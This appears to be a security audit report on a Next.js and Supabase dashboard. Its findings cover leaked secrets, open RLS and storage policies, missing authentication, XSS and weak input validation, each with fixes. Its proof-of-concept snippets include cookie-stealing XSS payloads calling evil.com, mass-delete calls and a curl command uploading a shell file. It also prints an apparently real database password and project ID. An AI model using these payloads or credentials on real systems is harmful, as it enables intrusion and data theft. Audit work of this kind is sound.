# Security Audit Report — Corteqs Dashboard

**Date:** 2026-04-23  
**Scope:** Full application — frontend, Supabase, auth, migrations, secrets, deps  
**Stack:** Next.js 14.2 (Pages Router) + Supabase JS SDK v2.42 + Tailwind

---

## Architecture & Trust Boundary Map

```
Browser (no auth)
  │
  ├── Next.js static pages (no SSR, no middleware, no API routes)
  │     └── React components call getSupabaseBrowserClient() directly
  │           └── Supabase anon key (public, embedded in JS bundle)
  │                 └── All tables: RLS enabled but policies = using(true)
  │                       └── Result: anonymous full CRUD on all data
  │
  └── No server-side code, no edge functions, no API routes
```

**Trust boundary:** There is none. The entire application trusts every anonymous browser request as if it were an admin.

### [CRITICAL] F-01: Supabase Service Role Key & DB Password Committed to Git History

**Where:** `.env.local` (lines 3-5), `.secret.md` (entire file), git commits `8792901`, `4cd9b46`, `3c0bb67`  
**Why it is vulnerable:** The following secrets are in committed files:

| Secret | Value (partial) |
|--------|----------------|
| `SUPABASE_SERVICE_ROLE_KEY` | `eyJ...v0ttxY` |
| `SUPABASE_ACCESS_TOKEN` | `sbp_dda6e23c...063f` |
| `SUPABASE_DB_PASSWORD` | `PPPlll!11321132` |
| `SUPABASE_PROJECT_ID` | `injprdrsklkxgnaiixzh` |
| Supabase anon key | `eyJ...0eFuA` |
| Old access token (`.secret.md`) | `sbp_410769b6...b400` |

Although `.gitignore` now lists `.env.local` and `.secret.md`, these files were already committed (3 commits). Any clone, fork, or CI cache has full database admin credentials.

**How it can be exploited:**
1. Attacker finds the repo (public or leaked).
2. `git show 8792901:.env.local` reveals the service_role key.
3. Attacker connects directly to Supabase with service_role — bypasses all RLS.
4. Full read/write/delete on every table and storage bucket.
5. DB password allows direct PostgreSQL connection (`postgresql://postgres:PPPlll!11321132@...`).

**Impact:** Complete database takeover. Data exfiltration, destruction, ransom. All user CVs, contact details, meeting notes, and business strategy exposed.

**Fix:**
1. **Immediately** rotate all secrets in Supabase Dashboard: service_role key, access token, DB password.
2. Rewrite git history to remove the blobs: `git filter-repo --invert-paths --path .env.local --path .secret.md`
3. Force-push all branches; notify anyone with clones.
4. Add a pre-commit hook to prevent future secret commits (e.g., `detect-secrets` or `git-secrets`).
5. Move `.env.local` entries that must stay out of source into the deployment platform's secret store (Coolify env vars).

**Confidence:** High

### [CRITICAL] F-02: All RLS Policies Grant Anonymous Full CRUD — Zero Authorization

**Where:** All 15 table policies across `supabase/migrations/*.sql`

Every application table uses this exact policy pattern:

```sql
CREATE POLICY "Allow all" ON <table> FOR ALL USING (true) WITH CHECK (true);
```

**Complete affected table list:**

| Table | Migration File | Data Sensitivity |
|-------|---------------|-----------------|
| `links` | `20260413100000` | Low |
| `mvp_items` | `20260413110000` | Low |
| `social_media_links` | `20260413120000` | Low |
| `user_cvs` | `20260413130000`, fixed in `20260417123000` | **HIGH — PII, file paths** |
| `arge_links` | `20260413140000` | Medium |
| `arge_cards` | `20260413140000` | Medium |
| `arge_files` | `20260413140000` | **HIGH — file paths** |
| `todo_items` | `20260412170000` | Medium |
| `contacts` | `20260412220000` | **HIGH — phone numbers, PII** |
| `meeting_notes` | `20260417100000` | Medium |
| `advisor_social_media_links` | `20260417130000` | Low |
| `gorevler` | `20260401223041` | Low |
| `draft_notlar` | `20260401224617` | Low |
| `todos` (legacy) | `migration_002` | Low |

**Why it is vulnerable:** `USING (true)` means every row passes the visibility check. `WITH CHECK (true)` means every insert/update passes. The `anon` role (unauthenticated, just needs the public anon key) has full SELECT/INSERT/UPDATE/DELETE on every row.

**How it can be exploited:**
```javascript
// Any browser console or curl:
const sb = createClient('https://injprdrsklkxgnaiixzh.supabase.co', '<anon_key>')
// Read all contacts with phone numbers:
await sb.from('contacts').select('*')
// Delete all meeting notes:
await sb.from('meeting_notes').delete().neq('id', 'never-match')
// Insert fake CV records:
await sb.from('user_cvs').insert({ first_name: 'Hacked', file_path: '../../../etc/passwd' })
// Modify all todo items:
await sb.from('todo_items').update({ konu: 'Pwned' }).neq('id', '')
```

**Impact:** Complete data breach (all PII exposed). Complete data destruction. Data poisoning (insert malicious content, modify existing records). No audit trail per user since there is no user identity.

**Fix:**
1. Create a new migration that replaces ALL `using (true) with check (true)` policies.
2. For tables that should be read-only for anon (links, mvp_items, etc.): `FOR SELECT USING (true)` only, remove INSERT/UPDATE/DELETE policies.
3. For sensitive tables (user_cvs, contacts, arge_files): require `authenticated` role and add `owner_id` column tied to `auth.uid()`.
4. Implement Supabase Auth (email/password or magic link) for all dashboard users.
5. Add a middleware in Next.js to redirect unauthenticated users.

**Confidence:** High

### [CRITICAL] F-03: Anonymous File Upload to `cv-files` Storage Bucket — No Restrictions

**Where:** `supabase/migrations/20260417123000_fix_user_cvs_and_storage_policies.sql` (lines 34-66), `src/components/hr/CvManager.tsx:82-88`

**Why it is vulnerable:**
The storage policies for `cv-files` bucket:

```sql
CREATE POLICY "cv_files_insert_public" ON storage.objects
  FOR INSERT TO anon, authenticated WITH CHECK (bucket_id = 'cv-files');
CREATE POLICY "cv_files_select_public" ON storage.objects
  FOR SELECT TO anon, authenticated USING (bucket_id = 'cv-files');
CREATE POLICY "cv_files_update_public" ON storage.objects
  FOR UPDATE TO anon, authenticated USING (bucket_id = 'cv-files');
CREATE POLICY "cv_files_delete_public" ON storage.objects
  FOR DELETE TO anon, authenticated USING (bucket_id = 'cv-files');
```

There is **no** constraint on:
- File path (any path in the bucket)
- File MIME type (any type accepted)
- File size (no limit)
- File extension
- Who uploaded vs who can delete

The client-side code in CvManager.tsx:82-88 only uses `accept=".pdf,.doc,.docx"` HTML attribute — trivially bypassed.

**How it can be exploited:**
```javascript
const sb = createClient(url, anonKey)
// Upload a 10GB malware executable:
await sb.storage.from('cv-files').upload('malware.exe', hugeFile)
// Upload an HTML file with XSS payload:
await sb.storage.from('cv-files').upload('xss.html', new Blob(['<script>steal()</script>'], {type:'text/html'}))
// Delete all existing CV files:
const { data } = await sb.storage.from('cv-files').list()
for (const f of data) await sb.storage.from('cv-files').remove([f.name])
// Overwrite someone's CV:
await sb.storage.from('cv-files').upload('<existing-uuid>.pdf', maliciousFile, { upsert: true })
```

**Impact:** Malware hosting on Supabase storage (account suspension risk). Data destruction (all CVs deleted). Stored XSS via uploaded HTML files. Storage cost abuse (unlimited uploads). CV impersonation (overwrite legitimate files).

**Fix:**
1. Remove `anon` from all storage policies — require `authenticated`.
2. Add path pattern validation: `WITH CHECK (bucket_id = 'cv-files' AND (storage.folder(name))[1] = auth.uid()::text)`.
3. Add a Supabase database function or trigger to validate MIME type server-side.
4. Set bucket file size limit in Supabase dashboard.
5. Add client-side and server-side file type validation.

**Confidence:** High

### [CRITICAL] F-04: No Authentication or Authorization Anywhere in the Application

**Where:** `src/lib/supabase.ts:37-43` (persistSession: false), `src/pages/_app.tsx`, all 16 page files, all 9 manager components

**Why it is vulnerable:**
- The Supabase client is initialized with `persistSession: false` and `autoRefreshToken: false` — it never establishes a user session.
- No `middleware.ts` exists — no route protection.
- No `getServerSideProps` checks auth — only one page even has `getStaticProps`.
- No component checks `supabase.auth.getUser()` before performing operations.
- No API routes exist — all database operations go directly from browser to Supabase.
- The application has zero concept of "logged in" vs "logged out".

**How it can be exploited:** Anyone who navigates to the deployed URL has full admin access to all CRUD operations on all data. No login required.

**Impact:** Complete unauthorized access to all application functionality.

**Fix:**
1. Implement Supabase Auth (email/password or magic links).
2. Add `src/middleware.ts` to check session on all routes.
3. Change `persistSession: true` in the Supabase client config.
4. Add auth checks before every database operation in manager components.
5. Restrict RLS policies to `authenticated` role only.

**Confidence:** High

### [CRITICAL] F-05: `arge-files` Storage Bucket Has No Migration — Likely Missing or Default-Permissive

**Where:** `src/components/arge/ArgeManager.tsx` uploads to `supabase.storage.from('arge-files')`, but no migration creates this bucket.

**Why it is vulnerable:** ArgeManager.tsx uploads files to `arge-files` bucket (line ~85, storage upload call), but no migration file creates this bucket or sets policies on it. This means either:
- The bucket was created manually in the Supabase dashboard (needs verification).
- It doesn't exist and uploads fail silently.
- If created manually, it likely uses the default permissive settings.

No `arge-files` bucket policy appears in any SQL file. The `cv-files` bucket is the only storage bucket defined in migrations.

**How it can be exploited:** If the bucket exists with default Supabase settings, it's publicly accessible. An attacker can enumerate bucket names and directly access all uploaded ARGE files.

**Impact:** Depends on bucket configuration (needs manual verification in Supabase dashboard).

**Fix:** Create a migration that explicitly defines the `arge-files` bucket with restrictive policies, or verify and fix the configuration in the Supabase dashboard.

**Confidence:** Medium — needs verification in Supabase dashboard.

### [HIGH] F-07: `dangerouslySetInnerHTML` Used Without Sanitization

**Where:** `src/components/mvp/GeneralSummaryCard.tsx:27`

```typescript
<div dangerouslySetInnerHTML={{ __html: content }} />
```

**Why it is vulnerable:** The `content` prop is rendered as raw HTML. Currently called from `src/pages/mvpitems.tsx:35-57` with a hardcoded template literal. However:

1. The component interface accepts any string — there is no type-level or runtime constraint.
2. If any future developer passes user-controlled data to this component, it becomes a stored XSS vector.
3. The pattern is dangerous even with current hardcoded content because the content is a multi-line template literal that could be accidentally modified.

**How it can be exploited:** If the `content` prop is ever sourced from the `mvp_items` table (which has no input sanitization and anonymous write access via F-02), an attacker could:
```javascript
await sb.from('mvp_items').insert({
  konu: '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
  ...
})
```

**Impact:** Stored XSS leading to session hijacking, credential theft, or malicious actions on behalf of other users.

**Fix:**
1. Replace `dangerouslySetInnerHTML` with React JSX rendering.
2. If HTML content is truly needed, add DOMPurify sanitization: `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />`
3. Add a TypeScript branded type for "sanitized HTML" to prevent accidental misuse.

**Confidence:** High — the component itself is safe today but the pattern is a loaded gun.

### [HIGH] F-08: No Input Validation or Sanitization Before Database Writes

**Where:** All 9 manager components and `src/lib/meeting-notes-data.ts`

**Why it is vulnerable:** Every form submission trims whitespace (`trim()`) and converts empty strings to null (`normalizeOptionalText()`), but there is:
- No length validation (strings can be arbitrarily long)
- No character filtering (special chars, HTML, SQL injection vectors stored as-is)
- No URL format validation server-side (only `type="url"` HTML attribute)
- No phone number format validation
- No content type validation for uploaded files
- No duplicate detection
- No rate limiting on create/update/delete operations

Example from `meeting-notes-data.ts:139-160`:
```typescript
const { data, error } = await supabase
  .from('meeting_notes')
  .insert({
    title: note.content.slice(0, 80),  // Only length limit in entire codebase
    content: note.content,              // Unlimited, unsanitized
    date: note.date,                    // No format validation
    category: note.category,            // TypeScript cast only, no runtime check
    source: note.source,                // TypeScript cast only
    sort_order: 9999,
  })
```

**How it can be exploited:**
- Spam: Create thousands of records per second (no rate limit).
- Database bloat: Insert 10MB strings into text fields.
- Stored content attacks: HTML/JS in content fields rendered in future UI changes.

**Impact:** Data quality degradation, potential DoS via storage exhaustion, stored injection payloads for future exploitation.

**Fix:**
1. Add input length limits on all text fields (e.g., max 500 chars for titles, 10000 for content).
2. Validate URL format with a proper URL parser server-side.
3. Add CHECK constraints in the database for field lengths.
4. Implement rate limiting (Supabase Edge Function or Next.js API route with rate limiter).
5. Add phone number format validation for the `contacts.telefon` field.

**Confidence:** High

### [HIGH] F-09: File Upload — No Server-Side MIME Validation, No Size Limits

**Where:** `src/components/hr/CvManager.tsx:82-88`, `src/components/arge/ArgeManager.tsx` (multiple upload locations)

**Why it is vulnerable:**
- CvManager: `accept=".pdf,.doc,.docx"` is HTML-only, trivially bypassed by:
  - Changing the file extension
  - Using browser DevTools to modify the input
  - Using curl/Postman directly
- ArgeManager: **No `accept` attribute at all** — accepts any file type.
- Neither component validates MIME type server-side.
- Neither component enforces file size limits.
- File paths use `crypto.randomUUID()` which is good for uniqueness but doesn't prevent path traversal if the random UUID is predictable (it's not — this is fine).

**How it can be exploited:**
```bash
# Upload a shell or malware via curl (bypasses HTML accept attribute):
curl -X POST "https://injprdrsklkxgnaiixzh.supabase.co/storage/v1/object/cv-files/shell.php" \
  -H "apikey: <anon_key>" \
  -H "Authorization: Bearer <anon_key>" \
  -F "file=@malware.exe"
```

**Impact:** Malware hosting, content type confusion attacks, storage cost abuse, potential account suspension by Supabase for ToS violation.

**Fix:**
1. Add server-side MIME validation via Supabase Edge Function or database trigger.
2. Set maximum file size in Supabase storage bucket settings.
3. Add allowed file extension whitelist in storage policies.
4. Scan uploaded files for malware.

**Confidence:** High

### [HIGH] F-10: User-Controlled URLs Rendered in `<a href>` Without Protocol Validation

**Where:**
- `src/components/socialmedia/SocialMediaManager.tsx:226` — `<a href={item.link}>`
- `src/components/advisorsocialmedia/AdvisorSocialMediaManager.tsx` — similar
- `src/components/links/LinkManager.tsx` — similar
- `src/components/hr/CvManager.tsx:313-324` — `<a href={withProtocol(cv.linkedinUrl)}>` (has `withProtocol` but still allows `javascript:`)

**Why it is vulnerable:** URLs stored in the database (which any anonymous user can write to via F-02) are rendered directly in `<a href>` attributes. The `type="url"` HTML validation is bypassed when writing directly to the database.

The `withProtocol()` function in CvManager.tsx:26-31 only prepends `https://` if no `http(s)://` prefix exists — it does NOT block `javascript:` URIs:
```typescript
function withProtocol(url: string): string {
  if (/^https?:\/\//i.test(url)) return url
  return `https://${url}`
}
// withProtocol('javascript:alert(1)') returns 'https://javascript:alert(1)' — safe
// BUT if stored as 'http://javascript:alert(1)' it passes through
```

For the other three components, there is NO `withProtocol()` — URLs go directly to `href`.

**How it can be exploited:**
```javascript
// Insert a javascript: URI directly via Supabase (bypasses HTML form):
await sb.from('social_media_links').insert({
  platform: 'Instagram',
  link: 'javascript:document.location="https://evil.com/steal?c="+document.cookie',
  added_by: 'UBT'
})
// When any user clicks the link → XSS
```

**Impact:** Reflected/stored XSS via malicious links. Cookie theft (if auth is added). Phishing redirect.

**Fix:**
1. Validate all URLs server-side to ensure they start with `https://` or `http://`.
2. Add URL sanitization before rendering: reject or strip `javascript:`, `data:`, `vbscript:` schemes.
3. Add a CHECK constraint on URL columns in the database: `CHECK (link ~ '^https?://')`.

**Confidence:** High

### [MEDIUM] F-11: No Security Headers (CSP, X-Frame-Options, etc.)

**Where:** `next.config.js`

```javascript
const nextConfig = {
  reactStrictMode: true,
  output: 'standalone',
}
```

**Why it is vulnerable:** No Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Referrer-Policy, no Permissions-Policy. The application is vulnerable to clickjacking, MIME-type sniffing, and has no CSP to mitigate XSS.

**Fix:** Add security headers in `next.config.js`:
```javascript
const securityHeaders = [
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Content-Security-Policy', value: "default-src 'self'; ..." },
]
```

**Confidence:** High

### [MEDIUM] F-15: Supabase Client Created Outside React Lifecycle — Potential Singleton Leak

**Where:** `src/lib/supabase.ts:23-46`

```typescript
let browserClient: SupabaseClient | null | undefined

export function getSupabaseBrowserClient(): SupabaseClient | null {
  if (browserClient !== undefined) return browserClient
  // ...
  browserClient = createClient(supabaseUrl, supabaseAnonKey, { ... })
  return browserClient
}
```

**Why it is vulnerable:** The client is a module-level singleton. Every component that calls `getSupabaseBrowserClient()` gets the same instance. This is intentional but means:
- All components share the same connection state.
- If auth is added later, a session in one component affects all others.
- The client is created at first call time with whatever env vars exist — no refresh mechanism.

**Impact:** Not directly exploitable, but creates coupling that will complicate adding auth later.

**Fix:** Consider using React context to provide the client, which allows for cleaner session management when auth is implemented.

**Confidence:** Low

### [LOW] F-17: No CSRF Protection (Future Risk When Auth Is Added)

**Where:** All form submissions in manager components

**Why it is vulnerable:** All forms use standard HTML form submission. When auth is added via Supabase cookies, there will be no CSRF protection. Supabase Auth with `persistSession: true` uses cookies that are automatically sent with requests.

**Impact:** When auth is implemented, an attacker could craft a page that submits forms on behalf of a logged-in user.

**Fix:** When implementing auth, ensure CSRF protection via SameSite cookie attributes and/or CSRF tokens.

**Confidence:** Medium — depends on future auth implementation.

### [INFORMATIONAL] F-18: No API Routes, No Server-Side Logic

**Where:** Entire `src/pages/` directory

The application has zero API routes (`src/pages/api/` does not exist) and zero middleware (`src/middleware.ts` does not exist). All business logic runs in the browser. This means:
- No server-side validation is possible.
- No server-side rate limiting is possible.
- No server-side auth checks are possible.
- The only backend is Supabase itself (with permissive RLS).

This is an architectural observation, not a direct vulnerability, but it means every fix for the above issues requires either Supabase-level changes (RLS, Edge Functions) or adding a server layer.

**Confidence:** High
